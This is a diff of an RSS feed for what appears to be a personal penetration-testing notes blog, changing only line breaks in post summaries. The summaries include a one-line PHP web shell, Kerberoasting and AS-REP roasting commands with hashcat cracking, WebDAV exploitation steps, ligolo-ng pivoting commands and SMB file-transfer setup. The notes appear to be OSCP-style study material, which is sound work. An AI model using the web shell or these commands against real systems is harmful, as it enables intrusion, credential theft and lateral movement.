@@ -13,14 +13,14 @@
       <link>http://localhost:1313/posts/webshell/index.html</link>
       <pubDate>Sun, 02 Aug 2026 23:34:58 +0900</pubDate>
       <guid>http://localhost:1313/posts/webshell/index.html</guid>
-      <description>php &lt;?php system($_GET[&#34;cmd&#34;]);?&gt;</description>
+      <description>php&#xD;&lt;?php system($_GET[&#34;cmd&#34;]);?&gt;</description>
     </item>
     <item>
       <title>Cheatsheet</title>
       <link>http://localhost:1313/posts/oscp_cheatsheet/index.html</link>
       <pubDate>Tue, 28 Apr 2026 20:19:35 +0900</pubDate>
       <guid>http://localhost:1313/posts/oscp_cheatsheet/index.html</guid>
-      <description>Kerberos Kerberoasting (service account) linux impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete windows Rubeus.exe kerberoast /nowrap /outfile:hash /format:hashcat hashcat:&#xA;hashcat -m 13100 hash.txt /path/to/wordlist -r /usr/share/hashcat/rules/best64.rule&#xA;AS-REP Roasting (user account) windows .\Rubeus.exe asreproast /nowrap /outfile:hash.txt linux impacket-GetNPUsers corp.com/dave -dc-ip 192.168.114.70 with userfile option (when only usernames are known) impacket-GetNPUsers shadow.gate/ -format hashcat -usersfile users.txt -request -dc-ip 10.0.26.64 hashcat:</description>
+      <description>Kerberos&#xD;Kerberoasting (service account)&#xD;linux impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete&#xD;windows Rubeus.exe kerberoast /nowrap /outfile:hash /format:hashcat&#xD;hashcat:&#xA;hashcat -m 13100 hash.txt /path/to/wordlist -r /usr/share/hashcat/rules/best64.rule&#xA;AS-REP Roasting (user account)&#xD;windows .\Rubeus.exe asreproast /nowrap /outfile:hash.txt&#xD;linux impacket-GetNPUsers corp.com/dave -dc-ip 192.168.114.70&#xD;with userfile option (when only usernames are known) impacket-GetNPUsers shadow.gate/ -format hashcat -usersfile users.txt -request -dc-ip 10.0.26.64&#xD;hashcat:</description>
     </item>
     <item>
       <title>Active Directory</title>
@@ -34,21 +34,21 @@
       <link>http://localhost:1313/posts/webdav/index.html</link>
       <pubDate>Wed, 15 Apr 2026 17:59:18 +0900</pubDate>
       <guid>http://localhost:1313/posts/webdav/index.html</guid>
-      <description>WebDAV Exploitation WebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows clients to perform remote file operations on a web server. When misconfigured, it can be a powerful attack surface — especially if it requires only basic credentials or has loose upload restrictions.&#xA;WebDAV typically requires credentials to interact with.&#xA;Step 1 — Enumerate Allowed File Types with davtest davtest tests which file types can be uploaded and executed on the target WebDAV server.</description>
+      <description>WebDAV Exploitation&#xD;WebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows clients to perform remote file operations on a web server. When misconfigured, it can be a powerful attack surface — especially if it requires only basic credentials or has loose upload restrictions.&#xA;WebDAV typically requires credentials to interact with.&#xA;Step 1 — Enumerate Allowed File Types with davtest&#xD;davtest tests which file types can be uploaded and executed on the target WebDAV server.</description>
     </item>
     <item>
       <title>Pivoting</title>
       <link>http://localhost:1313/posts/pivoting/index.html</link>
       <pubDate>Mon, 23 Feb 2026 11:11:32 +0900</pubDate>
       <guid>http://localhost:1313/posts/pivoting/index.html</guid>
-      <description>ligolo-ng Set a proxy server sudo ligolo-proxy -selfcert -laddr &#34;0.0.0.0:7878&#34;&#xA;Create an interface interface_create --name &#34;evil-cha&#34;&#xA;Add route (Target’s internal network) interface_add_route --name evil-cha --route 10.10.11.0/24&#xA;Access to the proxy server from the target machine ./agent -connect 192.168.45.224:7878 -ignore-cert&#xA;Check sessions from the proxy sessoin&#xA;Start tunneling tunnel_start --tun evil-cha&#xA;For local port forwarding.&#xA;Make sure the tunnel has started</description>
+      <description>ligolo-ng&#xD;Set a proxy server sudo ligolo-proxy -selfcert -laddr &#34;0.0.0.0:7878&#34;&#xA;Create an interface interface_create --name &#34;evil-cha&#34;&#xA;Add route (Target’s internal network) interface_add_route --name evil-cha --route 10.10.11.0/24&#xA;Access to the proxy server from the target machine ./agent -connect 192.168.45.224:7878 -ignore-cert&#xA;Check sessions from the proxy session&#xA;Start tunneling tunnel_start --tun evil-cha&#xA;For local port forwarding. (3 machines case)</description>
     </item>
     <item>
       <title>File Transfer</title>
       <link>http://localhost:1313/posts/file-transfer/index.html</link>
       <pubDate>Sun, 22 Feb 2026 23:22:16 +0900</pubDate>
       <guid>http://localhost:1313/posts/file-transfer/index.html</guid>
-      <description>SMB set up SMB server on kali&#xA;impacket-smbserver test . -smb2support -user user -password 1234&#xA;Connect to the SMB from windows&#xA;net use Z: \\192.168.45.211\test /user:user 1234&#xA;nc linux file receiver</description>
+      <description>SMB&#xD;set up SMB server on kali&#xA;impacket-smbserver test . -smb2support -user user -password 1234&#xA;Connect to the SMB from windows&#xA;net use Z: \\192.168.45.211\test /user:user 1234&#xA;nc&#xD;linux&#xD;file receiver</description>
     </item>
     <item>
       <title>Stabilize a reverse shell</title>
